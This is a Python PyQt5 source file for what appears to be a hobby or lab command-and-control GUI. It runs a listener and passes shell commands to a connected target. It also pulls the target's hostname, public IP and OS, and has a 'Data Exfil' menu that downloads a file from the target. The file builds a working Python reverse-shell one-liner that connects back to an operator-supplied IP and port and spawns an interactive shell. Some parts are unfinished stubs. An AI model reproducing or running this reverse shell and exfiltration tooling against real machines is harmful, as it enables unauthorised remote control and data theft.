import imports

import sys
from PyQt5 import QtWidgets, uic
from PyQt5.QtWidgets import QAction, QLabel, QMessageBox, QPushButton, QInputDialog

import threading

from server import s_sock, s_action
from client import c_sock

## importing other UI files
from shell_popup import Ui_shell_SEND
from listen_popup import Ui_listener_popup

qtcreator_file  = "gui.ui"
Ui_MainWindow, QtBaseClass = uic.loadUiType(qtcreator_file)


class MyApp(QtWidgets.QMainWindow, Ui_MainWindow):
    def __init__(self):
        QtWidgets.QMainWindow.__init__(self)
        Ui_MainWindow.__init__(self)
        self.setupUi(self)

        self.connected = False
        ## connector
        #self.action_Target_Connect.clicked.connect(self.target_connect)

        ## do not need to defire actions as they are already in the ui file
        #self.action1 = QAction("action_Target_Connect", self)
        
        ## ========================================
        ## Buttons n stuff ========================
        ## ========================================
        
        ## Disabling stuff that needs to be disabled at startup:
        #== top buttons
        self.action_Target_Info.setDisabled(True)
        self.menu_Target_SpawnShell.setDisabled(True)
        self.menuDetection_Prevention.setDisabled(True)
        self.menuDetection_Prevention.setDisabled(True)


        #== data upload/download
        self.menu_Data.setDisabled(True)
        self.menu_Data_Download.setDisabled(True)
        self.menu_Data_Upload.setDisabled(True)


        #== CMD input
        self.shell_input.setDisabled(True)
        self.shell_input_enter.setDisabled(True)


        
        
        ## Getting started
        self.GettingStarted_Readme.triggered.connect(self.getting_started)
        
        ## Main GUI
        self.action_Target_Listen.triggered.connect(self.listen_popup)
        self.action_Target_Info.triggered.connect(self.target_info)
        
        ## button for sending commands
        self.shell_input_enter.clicked.connect(self.run_command)
        self.shell_input_enter.setShortcut("Return")
        
        ## PopUp for shells:
        #self.action_Target_Python_binbash.triggered.connect(self.shell_py_binbash)
        self.action_Target_Python_binbash.triggered.connect(self.python_shell_popup)
        
        ## Data upload/download
        self.menu_Data_Download.triggered.connect(self.data_download_thread)
        self.menu_Data_Upload.triggered.connect(self.data_upload_thread)

        ## ========================================
        ## Init Values ===========================
        ## ========================================        
        ## sets connected to red on startup
        self.status_Connected.setStyleSheet("background-color: red")
        
    ## ========================================
    ## Getting started tab ====================
    ## ========================================
        
    def getting_started(self):
        
        ## need to create imports file to get this working properlyl
        
        with open('Modules/GUI_System/gui_about','r') as f:
            welcome_message = f.read()
            self.text_Program_Output.setText(welcome_message)

        
        
    ## ========================================
    ## Shell PopUps ===========================
    ## ========================================
    def python_shell_popup(self):
        ## Inits for the popup gui
        self.window = QtWidgets.QMainWindow()
        self.shell_popup = Ui_shell_SEND()
        self.shell_popup.setupUi(self.window)
        self.window.show()
        
        ## popping the shell prompt & running
        self.shell_popup.popup_shell_SEND.clicked.connect(self.python_shell_run_thread)
    
    def python_shell_run_thread(self):
        thread = threading.Thread(target=self.python_shell_run)
        #thread = threading.Thread(target=self.listen_popup())
        thread.start()
    
    def python_shell_run(self):
        ip = self.shell_popup.popup_shell_IP.text()
        port = self.shell_popup.popup_shell_PORT.text()
        program = self.shell_popup.popup_shell_SHELL.text()
        
        ## Hiding window after send button
        self.window.hide()
        
        ## Payload - to be imported/sent to a different module in future releases for space/simplicity
        payload = f"""
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{ip}",{port}));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["{program}","-i"]);'"""
        
        self.text_Program_Output.setText(server.send_msg(payload))
        
        
        ## pre-setting text in popup window
        #self.shell_popup.popup_shell_IP.setText("This is my text")
        #print(self.shell_popup.popup_shell_IP.text())
        
        
    def listen_popup(self):
        self.window = QtWidgets.QMainWindow()
        self.listen_popup = Ui_listener_popup()
        self.listen_popup.setupUi(self.window)
        self.window.show()
        
        self.listen_ip = self.listen_popup.popup_listen_ip.text()
        self.listen_port = self.listen_popup.popup_listen_port.text()
        
        print(self.listen_ip, self.listen_port)
        
        self.listen_popup.popup_listen_LISTEN.clicked.connect(self.target_listen_thread)
        #self.window.hide()

        #


    ## ========================================
    ## Server Functions =======================
    ## ========================================
   
## Thread for listener
    def target_listen_thread(self):
        self.window.hide()
        thread = threading.Thread(target=self.target_listen)
        #thread = threading.Thread(target=self.listen_popup())
        thread.start()
        
        self.status_Connected.setStyleSheet("background-color: purple")
        self.status_Connected.setText("Connection: Listening")
        #self.text_Program_Output.setText("Listening...")

## Start Listener
    def target_listen(self):
        ## hides input window

        ## This is essentially a block until a connection is established, that's why its in its own thread        
        s_sock.start_server(
            s_sock, 
            self.listen_popup.popup_listen_ip.text(), 
            int(self.listen_popup.popup_listen_port.text())
            )
        
        #self.text_Program_Output.setText()

        self.status_Connected.setStyleSheet("background-color: green")
        self.status_Connected.setText("Connection: Connected")
        
        self.connected = True
        
        ##enabling buttons again on connection
        if self.connected:
            self.action_Target_Info.setDisabled(False)
            self.menu_Target_SpawnShell.setDisabled(False)
            self.menuDetection_Prevention.setDisabled(False)
            
                    #== CMD input
            self.shell_input.setDisabled(False)
            self.shell_input_enter.setDisabled(False)

            #== Data Button 
            self.menu_Data.setDisabled(False)
            self.menu_Data_Download.setDisabled(False)
            self.menu_Data_Upload.setDisabled(False)

## Run a command
    def run_command(self):
        #server.send_msg(self.shell_input.text())
        self.text_Program_Output.setText(s_sock.send_msg(s_sock, self.shell_input.text()))
        ## Setting text back to nothing after a command
        self.shell_input.setText("")


## target info
    def target_info(self):
        self.status_data_HOSTNAME.setText(s_action.c_get_hostname())
        self.status_data_IPADDR.setText(s_action.c_pub_ip())
        self.status_data_OS.setText(s_action.c_os())
        
        #self.browser_Target_Status.setText(client.host.info())

    ## ========================================
    ## Data Exfil =============================
    ## ========================================

## Data Upload
    def data_upload_thread(self):
        print("UPLOAD")
        pass

    def data_upload(self):
        pass

## Data Download
    def data_download_thread(self):
        print("Downloads")
        self.text_Program_Output.setText(s_sock.file_download(s_sock, "download /home/kali/sensitivedata.txt"))


        pass

    def data_download(self):
        pass

    

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = MyApp()
    window.show()
    sys.exit(app.exec_())